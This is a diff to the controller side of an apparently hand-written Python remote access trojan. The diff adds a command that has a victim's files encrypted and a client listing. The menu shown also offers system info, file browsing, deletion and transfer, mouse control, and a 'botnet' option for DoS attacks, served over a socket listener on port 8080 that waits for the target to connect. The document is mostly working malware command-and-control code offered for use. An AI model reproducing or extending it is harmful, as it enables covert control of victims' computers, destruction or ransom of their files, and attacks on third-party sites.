@@ -1,5 +1,4 @@
 import sys
-import os
 import socket
 import threading
 import hashlib
@@ -25,9 +24,14 @@ print("[--exit] to exit" + "\n")
 
 command3 = input("Enter a command: ")
 if command3 == "--rat":
-    print("The commands for the rat are: ")
+    host = socket.gethostname()
+    print("\n"+ "The host that the target needs to connect is:", str(host))
+
+    print("\n" + "The commands for the rat are: ")
+    print("[clients] to see all the clients]")
     print("[sysinfo] to print info about the target system")
     print("[view_files] to see the path where the target runs the file")
+    print("[encrypt_files] to encrypt a specific file from the target")
     print("[custom_dir] to see all the files from a custom directory")
     print("[delete_file] to delete a file from the target (you need to know the path)")
     print("[send_files] to send a file (limit 10000 bytes)")
@@ -40,20 +44,13 @@ if command3 == "--rat":
     print("[mouse_click] to send mouse events that clicks the mouse")
     print("[botnet] to use your target machine to DoS sites" + "\n")
 
-    host = socket.gethostname()
-    try:
-        print("The ip of the host is: " + "\n")
-        host1 = os.system("ipconfig")
-    except:
-        host1 = os.system("ifconfig")
-    print("The host that the target needs to connect is:", str(host))
     port = 8080
     def client():
         s = socket.socket()
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((host, port))
         print("Waiting for the target to connect")
-        s.listen(1)
+        s.listen()
         conn, addr = s.accept()
         desktop = conn.recv(7000)
         desktop = desktop.decode()
@@ -82,11 +79,11 @@ if command3 == "--rat":
             for z in word:
                 x = hashlib.sha256(original_comman).hexdigest()
                 if x == y:
-                    hash = word
+                    hash2 = word
 
 
             print("command sent")
-            conn.send(hash.encode())
+            conn.send(hash2.encode())
 
 
             if command == "view_files":
@@ -97,6 +94,14 @@ if command3 == "--rat":
                     print("path: ", files)
                 except Exception as e:
                     print(str(e))
+            elif command == "encrypt_files":
+                x213 = input("Enter the path to the file you want to encrypt: ")
+                conn.send(x213.encode())
+                print("File encrypted")
+            elif command == "clients":
+                print("-------------")
+                print(f"The Clients are: {addr}")
+                print("-------------")
             elif command == "sysinfo":
                 system = conn.recv(1024)
                 system = system.decode()
